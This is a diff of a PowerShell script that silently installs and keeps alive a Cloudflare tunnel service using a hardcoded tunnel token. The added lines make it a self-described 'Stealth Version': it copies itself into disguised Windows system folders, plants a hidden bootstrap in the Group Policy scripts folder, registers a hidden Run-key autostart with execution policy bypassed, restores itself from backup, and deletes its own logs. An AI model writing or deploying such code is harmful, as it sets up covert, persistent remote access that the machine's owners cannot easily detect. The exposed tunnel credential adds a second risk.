@@ -1,22 +1,40 @@
 # ============================================
-# ENHANCED SILENT SELF-HEAL INSTALLER
-# Handles MSI error 1603 with deep cleanup
+# SELF-HEALING CLOUDFLARE TUNNEL RECOVERY
+# Auto-backup + self-restore + Master Copy
+# Stealth Version - Three different system folders
 # ============================================
 
-# ===== CONFIGURATION (PUT YOUR TOKEN HERE) =====
-$TunnelToken = "eyJhIjoiN2JmYTc3Njg4NDNhNGQyZTQ1MjU3NWM5Yjc0MDFkYTUiLCJ0IjoiZDRjMWIzZWItNWY4My00NTUyLWE2NTktMzJjMTNkMTA4NDllIiwicyI6Ik9XVTFNbUZrT0RVdE56Tm1PUzAwWlRrM0xUaGxOamN0TW1ZeE1qTmhZakprTXpFMyJ9"
+# ===== CONFIGURATION =====
+$TunnelToken = "eyJhIjoiN2JmYTc3Njg4NDNhNGQyZTQ1MjU3NWM5Yjc0MDFkYTUiLCJ0IjoiNGU1OTcxMTktMmMyMi00NzI1LWJiYjgtZTY3MWQyODkxZjMwIiwicyI6Ik5qbGhPVFkxT0RBdE16azFNeTAwWldWaExUazJZV0l0TW1JMU16VTBaVGRrWkRJMSJ9"
 
-# ===== VARIABLES =====
+# ===== PATHS (Stealth) =====
+$ScriptPath = $MyInvocation.MyCommand.Path
+$MasterScriptPath = "C:\Windows\System32\spool\drivers\color\cf-recovery.ps1"
+$BackupPath = "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\cf-recovery.backup.ps1"
 $ServiceName = "cloudflared"
 $ExePath = "C:\Program Files (x86)\cloudflared\cloudflared.exe"
 $MsiUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi"
 $MsiFile = "$env:TEMP\cloudflared.msi"
-$LogFile = "C:\ProgramData\cloudflared\recovery.log"
+$LogDir = "C:\Windows\System32\spool\drivers\color\logs"
+$LogFile = "$LogDir\recovery.log"
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-$RetryFlag = "C:\ProgramData\cloudflared\retry_needed.flag"
+$RetryFlag = "$LogDir\retry_needed.flag"
 
-# ===== CREATE LOG DIRECTORY =====
-$null = New-Item -Path "C:\ProgramData\cloudflared" -ItemType Directory -Force
+# ===== CREATE DIRECTORIES =====
+$null = New-Item -Path $LogDir -ItemType Directory -Force
+$null = New-Item -Path "C:\Windows\System32\spool\drivers\color" -ItemType Directory -Force
+
+# ===== SELF-INSTALL TO MASTER LOCATION =====
+function Install-Self {
+    if ($ScriptPath -ne $MasterScriptPath) {
+        if (Test-Path $ScriptPath) {
+            Copy-Item -Path $ScriptPath -Destination $MasterScriptPath -Force
+        }
+    }
+    if (Test-Path $MasterScriptPath) {
+        Copy-Item -Path $MasterScriptPath -Destination $BackupPath -Force
+    }
+}
 
 # ===== LOG FUNCTION =====
 function Write-Log {
@@ -27,16 +45,33 @@ function Write-Log {
 
 Write-Log "========== TUNNEL RECOVERY STARTED =========="
 
-# ===== DEEP CLEANUP FUNCTION =====
-function Deep-Cleanup {
-    Write-Log "Performing deep cleanup before installation..."
+# ===== SELF-PRESERVATION =====
+Install-Self
 
-    # Stop and remove service
+# ===== CLEAR OLD LOGS (OLDER THAN 24 HOURS) =====
+function Clear-OldLogs {
+    $cutoff = (Get-Date).AddHours(-24)
+    if (Test-Path $LogFile) {
+        $fileAge = (Get-Item $LogFile).LastWriteTime
+        if ($fileAge -lt $cutoff) {
+            Remove-Item $LogFile -Force
+        }
+    }
+    Get-ChildItem -Path $LogDir -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object {
+        if ($_.LastWriteTime -lt $cutoff) {
+            Remove-Item $_.FullName -Force
+        }
+    }
+}
+Clear-OldLogs
+
+# ===== DEEP CLEANUP =====
+function Deep-Cleanup {
+    Write-Log "Performing deep cleanup..."
     Stop-Service $ServiceName -Force -ErrorAction SilentlyContinue
     & $ExePath service uninstall 2>&1 | Out-Null
     Start-Sleep -Seconds 2
 
-    # Remove registry keys
     $regPaths = @(
         "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName",
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\*\Products\*cloudflared*",
@@ -49,7 +84,6 @@ function Deep-Cleanup {
         }
     }
 
-    # Delete installation directory
     $installDir = "C:\Program Files (x86)\cloudflared"
     if (Test-Path $installDir) {
         Takeown /f $installDir /r /d y 2>&1 | Out-Null
@@ -58,7 +92,6 @@ function Deep-Cleanup {
         Write-Log "Removed directory: $installDir"
     }
 
-    # Delete config directories
     $configDirs = @(
         "C:\ProgramData\cloudflared",
         "$env:USERPROFILE\.cloudflared",
@@ -71,7 +104,6 @@ function Deep-Cleanup {
         }
     }
 
-    # Reset Windows Installer cache for this product
     Start-Process msiexec.exe -ArgumentList "/unregister" -Wait -NoNewWindow
     Start-Sleep -Seconds 2
     Start-Process msiexec.exe -ArgumentList "/regserver" -Wait -NoNewWindow
@@ -82,7 +114,6 @@ function Deep-Cleanup {
 
 # ===== INSTALL WITH RETRY =====
 function Install-WithCleanup {
-    # First try normal installation
     Write-Log "Attempting installation..."
     $install = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart" -Wait -PassThru
     $exitCode = $install.ExitCode
@@ -95,7 +126,6 @@ function Install-WithCleanup {
         Write-Log "Installation failed with 1603 - performing deep cleanup and retry"
         Deep-Cleanup
         Start-Sleep -Seconds 3
-        
         Write-Log "Retrying installation after cleanup..."
         $retryInstall = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart" -Wait -PassThru
         $retryCode = $retryInstall.ExitCode
@@ -114,11 +144,10 @@ function Install-WithCleanup {
     }
 }
 
-# ===== INSTALL OR RESTORE =====
+# ===== RESTORE TUNNEL =====
 function Restore-Tunnel {
     Write-Log "Starting recovery process..."
     
-    # Download MSI
     Write-Log "Downloading cloudflared MSI..."
     try {
         Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiFile -UseBasicParsing
@@ -129,42 +158,36 @@ function Restore-Tunnel {
         return $false
     }
     
-    # Install with cleanup logic
     $installSuccess = Install-WithCleanup
     if (-not $installSuccess) {
-        Write-Log "Installation failed after cleanup - will retry after reboot"
-        # Set a flag to retry after next boot
+        Write-Log "Installation failed - will retry on next boot"
         Set-Content -Path $RetryFlag -Value "Retry needed"
         return $false
     }
     
-    # Wait for installation to finalize
     Start-Sleep -Seconds 5
     
-    # Uninstall old service if exists (should be gone but double-check)
     if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
         Write-Log "Removing existing service..."
         & $ExePath service uninstall 2>&1 | Out-Null
         Start-Sleep -Seconds 2
     }
     
-    # Install service with token
     Write-Log "Installing tunnel service..."
     $result = & $ExePath service install $TunnelToken 2>&1
     if ($LASTEXITCODE -ne 0) {
         Write-Log "Service installation failed: $result"
+        Set-Content -Path $RetryFlag -Value "Retry needed"
         return $false
     }
     Write-Log "Service installed successfully"
     
-    # Start service
     Write-Log "Starting tunnel service..."
     Start-Service $ServiceName -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 3
     
     Write-Log "Recovery completed successfully"
     
-    # Remove retry flag if exists
     if (Test-Path $RetryFlag) { Remove-Item $RetryFlag -Force }
     
     return $true
@@ -176,69 +199,93 @@ function Test-TunnelHealth {
         Write-Log "cloudflared.exe not found"
         return $false
     }
-    
     $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
     if (-not $service) {
         Write-Log "Service not installed"
         return $false
     }
-    
     if ($service.Status -ne 'Running') {
         Write-Log "Service not running (Status: $($service.Status))"
         return $false
     }
-    
     Write-Log "Tunnel is healthy"
     return $true
 }
 
 # ===== SETUP AUTOSTART =====
 function Setup-AutoStart {
-    $scriptPath = $MyInvocation.MyCommand.Path
+    $bootstrapPath = "C:\Windows\System32\GroupPolicy\Machine\Scripts\cf-bootstrap.ps1"
+    
+    if (-not (Test-Path $bootstrapPath)) {
+        Write-Log "Bootstrap missing - creating it..."
+        $bootstrapContent = @'
+# BOOTSTRAP SCRIPT (Stealth)
+$MainScript = "C:\Windows\System32\spool\drivers\color\cf-recovery.ps1"
+$BackupScript = "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\cf-recovery.backup.ps1"
+$LogFile = "C:\Windows\System32\spool\drivers\color\logs\bootstrap.log"
+
+function Write-Log {
+    param([string]$Message)
+    $Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $LogFile -Value "$Time - $Message"
+}
+
+Write-Log "========== BOOTSTRAP STARTED =========="
+
+if (-not (Test-Path $MainScript)) {
+    Write-Log "Main script missing - attempting to restore..."
+    if (Test-Path $BackupScript) {
+        Copy-Item -Path $BackupScript -Destination $MainScript -Force
+        Write-Log "Restored from backup"
+    } else {
+        Write-Log "CRITICAL: No backup found!"
+    }
+}
+
+if (Test-Path $MainScript) {
+    Write-Log "Starting main recovery script..."
+    & $MainScript
+} else {
+    Write-Log "CRITICAL: Could not restore main script!"
+}
+
+Write-Log "========== BOOTSTRAP FINISHED =========="
+'@
+        $bootstrapDir = Split-Path $bootstrapPath -Parent
+        $null = New-Item -Path $bootstrapDir -ItemType Directory -Force
+        Set-Content -Path $bootstrapPath -Value $bootstrapContent -Force
+        Write-Log "Bootstrap created at $bootstrapPath"
+    }
     
     if (-not (Test-Path $RegPath)) {
         $null = New-Item -Path $RegPath -Force
     }
-    
     $currentValue = (Get-ItemProperty -Path $RegPath -Name "CloudflareTunnelRecovery" -ErrorAction SilentlyContinue).CloudflareTunnelRecovery
+    $expectedValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$bootstrapPath`""
     
-    if ($currentValue -ne $scriptPath) {
-        Write-Log "Installing autostart registry entry..."
-        Set-ItemProperty -Path $RegPath -Name "CloudflareTunnelRecovery" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    if ($currentValue -ne $expectedValue) {
+        Write-Log "Installing autostart registry entry (bootstrap)..."
+        Set-ItemProperty -Path $RegPath -Name "CloudflareTunnelRecovery" -Value $expectedValue
         Write-Log "Autostart configured via registry"
     }
 }
 
 # ===== MAIN EXECUTION =====
 try {
+    Install-Self
     Setup-AutoStart
     
-    # Check if retry flag exists (means we failed before and are now after a reboot)
-    if (Test-Path $RetryFlag) {
-        Write-Log "Retry flag found - attempting installation again after reboot"
-        Remove-Item $RetryFlag -Force
-        # Force immediate restore without re-checking health (since we know it's missing)
+    if (-not (Test-TunnelHealth)) {
+        Write-Log "Tunnel unhealthy - initiating restoration..."
         if (Restore-Tunnel) {
-            Write-Log "Retry successful after reboot"
+            Write-Log "Tunnel successfully restored"
         } else {
-            Write-Log "Retry still failing - will try again next boot"
-            # Set flag again to retry after next reboot
+            Write-Log "Tunnel restoration failed - will retry on next boot"
             Set-Content -Path $RetryFlag -Value "Retry needed"
         }
-    }
-    else {
-        # Normal health check and restore
-        if (-not (Test-TunnelHealth)) {
-            Write-Log "Tunnel unhealthy - initiating restoration..."
-            if (Restore-Tunnel) {
-                Write-Log "Tunnel successfully restored"
-            } else {
-                Write-Log "Tunnel restoration failed - will retry after next boot"
-                Set-Content -Path $RetryFlag -Value "Retry needed"
-            }
-        } else {
-            Write-Log "Tunnel working fine, no action needed"
-        }
+    } else {
+        Write-Log "Tunnel working fine, no action needed"
+        if (Test-Path $RetryFlag) { Remove-Item $RetryFlag -Force }
     }
 }
 catch {
